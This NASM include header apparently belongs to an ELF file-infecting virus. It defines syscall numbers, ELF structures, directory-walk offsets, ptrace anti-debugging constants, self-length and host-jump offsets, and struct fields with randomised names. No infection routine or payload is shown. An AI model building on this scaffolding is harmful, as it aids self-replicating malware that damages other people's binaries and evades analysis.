; SYSCALL
%define SYS_READ 0
%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_LSEEK 8
%define SYS_MMAP 9
%define SYS_UNMAP 11
%define SYS_SOCKET 41
%define SYS_CONNECT 42
%define SYS_SENDTO 44
%define SYS_RECVFROM 45
%define SYS_EXIT 60
%define SYS_FTRUNCATE 77
%define SYS_PTRACE 101
%define SYS_GETPPID 110
%define SYS_GETDENTS 217

; SOCKET
%define AF_INET 2
%define SOCK_STREAM 1

; OPEN
%define O_RDONLY 0x0000
%define O_WRONLY 0x0001
%define O_RDWR 0x0002
%define O_DIRECTORY 0q0200000
%define O_CREAT 0x0040

; DIRENT
%define D_INO_OFF 0x00
%define D_FOLDER 0x4
%define D_OFF_OFF 0x08
%define D_REG_FILE 0x8
%define D_RECLEN_OFF 0x10
%define D_TYPE 0x12
%define D_NAME 0x13

; MMAP
%define PROT_EXEC 1
%define PROT_READ 2
%define PROT_WRITE 4
%define MAP_SHARED 1
%define MAP_PRIVATE 2
%define MAP_ANONYMOUS 0x20

; LSEEK
%define SEEK_SET 0x0
%define SEEK_END 0x2

; PTRACE
%define PTRACE_TRACEME 0x0
%define PTRACE_DETACH 0x17

%define CODE_LEN (_end - _start)
%define FINJMP_OFF (_bf_exit - _start)
%define PAGE_SIZE 0x1000

%define FAM(x) [(rbp - Shvlvb_size) + x]
%define SOCK(x) [(rbp - sock_size) + x]
%define INF(x) [(rbp - PoRdqPMgt_size) + x]

%define CODE_LEN (_end - _start)
%define FINJMP_OFF (_bf_exit - _start)
%define PAGE_SIZE 0x1000

struc Shvlvb
.qkDYhi resb PAGE_SIZE
.bTjqM7z: resb PAGE_SIZE
.fkyBjYCV resq 1
.SibqLjS: resd 1
.tGugJKn: resd 1
.pMALH resq 1
endstruc

struc PoRdqPMgt
.Zsft6Y resq 1
.O6JcGDQ8 resq 1
.nwldy resq 1
.GCChBGUj resb 1
.snil8kH7O1 resq 1
.sai0R resq 1
.tMviw1ZUJ resq 1
.JmYCSpo resq 1
.xPfbGBNGq resq 1 
.FQLVP5B3ym resq 1
.gwCxUEILZ resq 1
.mjPo44 resb 1
.CK08uayA resq 1
.XlUhU resq 1
.CPoGW resq 1
endstruc

; ELF structures
%define PT_LOAD 0x1
%define PT_NOTE 0x4
%define PF_X 0x1
%define PF_R 0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc TOf5yzv6
.XzHMUOaT2: resb 16
.hEvPXl0E9A: resw 1
.qczuF5: resw 1
.Rc86Y: resd 1
.EYphv36: resq 1
.nr4J9Q: resq 1
.XsB97qG: resq 1
.s4cQaC: resd 1
.bZ0X5W1JA: resw 1
.Wrk45: resw 1
.NR9W93: resw 1
.mdlpECk8i: resw 1
.GtZ1j4scz: resw 1
.TXmvIBC: resw 1
endstruc

struc XJGfQkF
.JR3hIn: resd 1
.hPvV26rgg6: resd 1
.rT3bQrVn: resq 1
.sL407vQ: resq 1
.tYcD3dYS: resq 1
.vU9dORhmT: resq 1
.GLCDV8S1: resq 1
.PX2YhuDtq: resq 1
endstruc

struc TIOTNws8Sq
.rvJuciT: resd 1
.H0uE7: resd 1
.qcy03O: resq 1
.Ydfzf08Gl: resq 1
.jnJ5ztt: resq 1
.dSx3ekZ: resq 1
.CDAVpYkNbO: resd 1
.LPff9n: resd 1
.Sjv4y resq 1
.XStnrzISp resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 